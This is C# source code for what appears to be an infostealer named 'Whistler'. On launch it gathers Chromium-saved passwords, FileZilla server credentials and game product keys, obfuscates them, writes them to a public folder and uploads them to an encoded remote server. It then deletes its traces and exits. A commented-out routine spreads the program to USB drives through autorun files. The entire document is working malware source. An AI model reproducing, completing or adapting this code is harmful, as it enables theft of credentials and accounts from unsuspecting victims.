#region  Namespaces
using System;
using System.Xml;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Net.NetworkInformation;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Text;
using ChromeRecovery;
using Whistler.Classes;
using Whistler.Classes.Targets;

#endregion

namespace W2
{
    public partial class frmMain : Form
    {
        public frmMain()
        {
            InitializeComponent();
        }
        
        #region common variables
        //User VARS
        public static string urlToServer        = classCrypto.Lambda.Encode("ENCODED",8521);
        public static string filepath           = "C:\\Users\\Public\\";
        //Program VARS
        public static string hardwareID         = System.Security.Principal.WindowsIdentity.GetCurrent().User.Value;
        public static readonly string AppData   = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static readonly string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static string username           = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        public static string currentDateTime    = DateTime.Now.ToString();
        //Servers
        public static string[] strFilenames     = { "sitemanager.xml", "recentservers.xml" };
        public static string strFolderPath      = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla");
        public static string decoded;
        public static string FZ_final;
        public static string chrome_final;
        #endregion

        static void USB()//Removed from src because its detected and outdated since win8
        {
            //try
            //{
            //    DriveInfo[] drives = DriveInfo.GetDrives();//from github - detected his father lol
            //    foreach (DriveInfo drive in drives)
            //    {
            //        if (drive.DriveType == DriveType.Removable)
            //        {
            //            StreamWriter writer = new StreamWriter(drive.Name + "autorun.inf");
            //            writer.WriteLine("[autorun]\n");
            //            writer.WriteLine("open=autorun.exe");
            //            writer.WriteLine("action=Run win32");
            //            writer.Close();
            //            File.SetAttributes(drive.Name + "autorun.inf", File.GetAttributes(drive.Name + "autorun.inf") | FileAttributes.Hidden);
            //            File.Copy(Application.ExecutablePath, drive.Name + "autorun.exe", true);
            //            File.SetAttributes(drive.Name + "autorun.exe", File.GetAttributes(drive.Name + "autorun.exe") | FileAttributes.Hidden);
            //        }
            //    }
            //}
            //catch { }
        }

        static void Post(string chrome)
        {
            try
            {
                string encoded = classCrypto.ROT13.Encode(chrome + FZ_final + classKeys.gamekeys());
                string encoded02 = classCrypto.Lambda.Encode(encoded, 1432);
                chrome_final = encoded02;
                File.WriteAllText(filepath + IPGlobalProperties.GetIPGlobalProperties().HostName
                    + "_" + hardwareID + "_Log.txt", chrome_final);
                HttpWebRequest.DefaultWebProxy = new WebProxy();
                WebClient Client = new WebClient();
                Client.Headers.Add("Content-Type", "binary/octet-stream");
                byte[] result = Client.UploadFile(urlToServer, "POST", filepath
                    + IPGlobalProperties.GetIPGlobalProperties().HostName
                    + "_" + hardwareID + "_Log.txt");
                string s = System.Text.Encoding.UTF8.GetString(result, 0, result.Length);
                File.Delete(filepath + IPGlobalProperties.GetIPGlobalProperties().HostName
                    + "_" + hardwareID + "_Log.txt");
                File.Delete("C:\\users\\public\\temp.db");
            }
            catch {  }
        }

        static bool IsOnline(string website)
        {
            try
            {
                HttpWebRequest.DefaultWebProxy = new WebProxy();
                HttpWebRequest Request = (HttpWebRequest)HttpWebRequest.Create(website);
                HttpWebResponse Response = (HttpWebResponse)Request.GetResponse();
                if (HttpStatusCode.OK == Response.StatusCode)
                {
                    Response.Close();
                    return true;
                }
                else
                {
                    Response.Close();
                    return false;
                }
            }
            catch (WebException)
            {
                return false;
            }
        }

        public static string build_string()//Infected-Zone.com
        {
            StringBuilder stringBuilder = new StringBuilder();
            List<Account> list = Chromium.Grab();
            foreach (Account account in list)
            {
                stringBuilder.AppendLine("Url: " + account.URL);
                stringBuilder.AppendLine("Username: " + account.UserName);
                stringBuilder.AppendLine("Password: " + account.Password);
                stringBuilder.AppendLine("Application: " + account.Application);
                stringBuilder.AppendLine("=============================");
            }
            return stringBuilder.ToString();

        }
        private void frmMain_Load(object sender, EventArgs e)
        {
            if (IsOnline("https://google.com"))
            {
                classFileZilla.FZ();
                //classVPN.ProtonVPN.Start(filepath+"\\proton.log");//Disabled because the logs are not decrypted yet
                string keys = classKeys.gamekeys();
                string creds = keys;
                creds += build_string();
                Post(creds);//Upload
                Application.Exit();
            }
            else
            {
                Application.Exit();
            }
        }
    }
}
